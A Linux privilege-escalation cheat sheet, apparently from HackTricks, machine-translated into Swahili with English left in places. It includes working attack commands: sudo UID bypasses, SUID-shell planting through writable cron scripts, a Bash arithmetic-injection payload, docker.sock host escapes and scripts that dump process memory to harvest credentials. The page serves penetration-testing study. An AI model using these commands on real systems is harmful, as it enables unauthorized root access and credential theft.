# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Tuanze kujifunza kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya `PATH`**, unaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za mazingira

Je, kuna taarifa za kuvutia, nywila au API keys katika vigezo vya mazingira?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia kernel version na kama kuna exploit yoyote inayoweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata vulnerable kernel list nzuri na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa all the vulnerable kernel versions kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (tekeleza KATIKA victim, inachunguza tu exploits za kernel 2.x)

Kila mara **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika kernel exploit fulani na hivyo utakuwa na uhakika kuwa exploit hiyo ni halali.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo ya sudo yenye udhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinawawezesha watumiaji wa ndani wasio na ruhusa kuinua vibali vyao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye direktori inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia ile [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina udhaifu na linaunga mkono kipengele cha `chroot`.

Kwa taarifa zaidi, rejea taarifa ya awali ya [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg uthibitishaji wa saini umefeli

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka kwake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **kinachowekwa (mounted) na kinachotolewa (unmounted)**, wapi na kwa nini. Ikiwa kitu chochote kimeondolewa (unmounted) unaweza kujaribu kukiweka (mount) na kukagua taarifa za kibinafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia kernel exploit kwani inashauriwa ku-compile kwenye mashine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Imezowekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mikono toleo la programu zilizowekwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua programu zisizosasishwa na zilizo hatarishi zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na msaada, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa zitakazokagua ikiwa toleo lolote la software lililosakinishwa linaloweza kuathirika kwa exploits zinazojulikana_

## Michakato

Angalia **michakato gani** inaendeshwa na angalia kama kuna mchakato unao **idhini zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** hutambua hizo kwa kuchunguza kigezo `--inspect` ndani ya command line ya mchakato.\
Pia **check your privileges over the processes binaries**, labda unaweza ku-overwrite moja yao.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials in clear text inside the memory**.\
Kawaida utahitaji **root privileges** ili kusoma memory ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida inakuwa na manufaa zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba sasa mashine nyingi **haziruhusu ptrace by default** ambayo ina maana huwezi ku-dump michakato mingine inayomilikiwa na mtumiaji wako usio na ruhusa.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ikiwa una upatikanaji wa memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato inayotolewa, **maps zinaonyesha jinsi memory inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia zinaonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia **mem** **inafunua memory ya mchakato wenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **eneo gani za memory zinaweza kusomwa** na ofseti zao. Tunatumia taarifa hizi **kutafuta ndani ya faili ya mem na dump maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa kumbukumbu ya mfumo ya **physical**, si kumbukumbu ya virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa Linux

ProcDump ni toleo la Linux la zana klasiki ya ProcDump kutoka kwenye suite ya Sysinternals kwa Windows. Pata kutoka [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Ili dump kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na dump mchakato unaomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vifikisho vya kuingia kutoka Kumbukumbu ya Mchakato

#### Mfano (kwa mkono)

Ikiwa utagundua kuwa mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump process (tazama sehemu zilizotangulia ili kupata njia tofauti za ku-dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitatenda **steal clear text credentials from memory** na kutoka kwa baadhi ya **well known files**. Inahitaji root privileges ili kifanye kazi ipasavyo.

| Kipengele                                         | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inaendesha kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kwa kutumia SSH local port-forwarding na kuunda kazi yenye ruhusa za juu ili kufanya privesc.

Mfululizo wa kawaida
- Gundua port inayopatikana kwa loopback pekee (mfano, 127.0.0.1:8000) na Basic-Auth realm kwa kutumia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayofunua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Fungua tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda kazi ya high-priv na uitekeleze mara moja (huunda SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Uimarishaji
- Usiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa ndogo
- Unganisha kwa localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumie nywila tena
- Epuka kuingiza secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa on-demand job executions

Angalia kama kuna scheduled job iliyo hatarishi. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza modify files ambazo root hutumia? tumia symlinks? unda files maalum katika directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika kwenye /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya command, unaweza kuitumia kusababisha mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard iko mbele ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **si hatarini).**

Soma ukurasa ufuatao kwa zaidi ya wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa cron/parser ya root inasoma untrusted log fields na kuziweka katika arithmetic context, attacker anaweza kuingiza command substitution $(...) ambayo inatekelezwa kama root wakati cron inapoendesha.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa unaweza **kubadilisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa muhimu kufuta ile folder na **unda folder ya symlink kwa nyingine** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron binaries zilizosainiwa kwa kibinafsi zenye payloads zinazoweza kuandikwa
Blue teams mara nyingine hufanya "sign" binaries zinazoendeshwa na cron kwa ku-dump sehemu maalum ya ELF na kisha kufanya grep kwa vendor string kabla ya kuziendesha kama root. Ikiwa binary hiyo inaruhusu group-writable (mfano, `/opt/AV/periodic-checks/monitor` miliki `root:devs 770`) na unaweza leak signing material, unaweza kuunda sehemu bandia na ku-hijack cron task:

1. Tumia `pspy` kupata verification flow. Katika Era, root alitekeleza `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` na kisha kuendesha faili.
2. Unda tena cheti kinachotarajiwa kwa kutumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Jenga faili mbadala ya hatari (mfano, weka SUID bash, ongeza SSH key yako) na weka cheti ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Andika juu binary iliyopangwa huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri kwa cron run ijayo; mara signature check isiyokuwa makini itakapofaulu, payload yako itaendeshwa kama root.

### Frequent cron jobs

Unaweza kufuatilia processes kutafuta zile zinazoendeshwa kila dakika 1, 2 au 5. Labda unaweza kuchukua fursa hiyo na escalate privileges.

Kwa mfano, ili **fuatilia kila 0.1s kwa muda wa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimetekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na cronjob itafanya kazi. Mfano (zingatia herufi ya carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **iitekeleze** **backdoor** yako wakati service inapo**anza**, **inapoanzishwa upya** au **inaposimama** (labda utahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano unda backdoor yako ndani ya .service file kwa **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Kumbuka kwamba ikiwa una **write permissions over binaries being executed by services**, unaweza kuzibadilisha kuwa backdoors, hivyo wakati services zitakapotekelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa unagundua kwamba unaweza **kuandika** katika yoyote ya folda kwenye njia, unaweza kuwa na uwezo wa **kupandisha ruhusa**. Unahitaji kutafuta **relative paths being used on service configurations** files kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na binary ya relative path** ndani ya folda ya PATH ya systemd ambayo unaweza kuandika, na wakati service itaombwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasio na ruhusa kwa kawaida hawawezi kuanza/kuacha services lakini angalia ikiwa unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni unit files za systemd ambazo majina yao huishia kwa `**.timer**` na zinadhibiti files au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengwa kwa matukio ya kalenda na matukio ya monotonic time na zinaweza kuendeshwa kwa njia isiyo ya sinkroni.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma Unit ni nini:

> Kitengo cha kuamsha wakati timer hii inapotimia. Hoja ni jina la unit, ambalo kiambishi chake si ".timer". Ikiwa haijataja, thamani hii itatumika kwa service ambayo ina jina sawa na timer unit, isipokuwa kwa kiambishi. (Angalia hapo juu.) Inashauriwa kwamba jina la unit linaloamshwa na jina la timer unit vitwe kwa namna ileile, isipokuwa kwa kiambishi.

Hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta unit fulani ya systemd (kama `.service`) ambayo **inayotekeleza binary inayoweza kuandikwa**
- Tafuta unit fulani ya systemd ambayo **inayotekeleza relative path** na una **ruhusa za kuandika** juu ya **systemd PATH** (ili kuigiza executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inaundwa/inaamshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano kati ya process** kwenye mashine ileile au tofauti ndani ya modeli za client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano ya ndani na huanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vinavyovutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari unatumika **kuonyesha mahali itakaposikiliza** socket (path ya AF_UNIX socket file, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Inachukua boolean argument. Ikiwa **true**, **service instance itaanzishwa kwa kila connection inayokuja** na socket ya connection peke yake ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza wenyewe **ndizo zitapasswa kwa service unit iliyozinduliwa**, na service unit moja tu itaanzishwa kwa connections zote. Thamani hii hairuhusiwi kwa datagram sockets na FIFOs ambapo service unit moja bila masharti hushughulikia trafiki yote inayoingia. **Default ni false**. Kwa sababu za performance, inashauriwa kuandika daemons mpya kwa njia inayofaa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambazo **zinatekelezwa kabla** au **baada** ya kusikilizwa kwa **sockets**/FIFOs kuundwa na ku-bind, kwa mtiririko huo. Tokeni ya kwanza ya line ya amri lazima iwe jina la file kamili (absolute filename), ikifuatiwa na argument za process.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo zina **tekelezwa kabla** au **baada** ya sockets/FIFOs za kusikiliza kufungwa na kuondolewa, kwa mtiririko huo.
- `Service`: Inaeleza jina la service unit **kuzinduliwa** wakati wa **trafiki inayoingia**. Setting hii inaruhusiwa tu kwa sockets zenye Accept=no. Inategemewa kwa default kuwa service yenye jina sawa na socket (ukibadilisha suffix). Katika kesi nyingi, haitakuwa lazima kutumia option hii.

### Inaweza kuandikwa .socket files

Ikiwa utapata `.socket` file **inayoweza kuandikwa** unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaundwa. Kwa hivyo, **labda utahitaji kusubiri mashine izinduliwe upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **utatafuta socket yoyote inayoweza kuandikwa** (_hapa tunazungumzia Unix Sockets na si kuhusu config `.socket` files_), basi **unaweza kuwasiliana** na socket hiyo na labda utumie udhaifu (exploit a vulnerability).

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa huenda kuna baadhi ya **sockets listening for HTTP** requests (_Sio kuhusu .socket files ninazozungumzia, bali mafaili yanayotumika kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker socket inayoweza kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, it's writable by the `root` user na wanachama wa kundi la `docker`. Kupata haki za kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una haki ya kuandika kwenye Docker socket, unaweza escalate privileges ukitumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Haya maagizo yanakuwezesha kuendesha container yenye root-level access kwenye file system ya host.

#### **Using Docker API Directly**

Katika matukio ambapo Docker CLI haipo, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

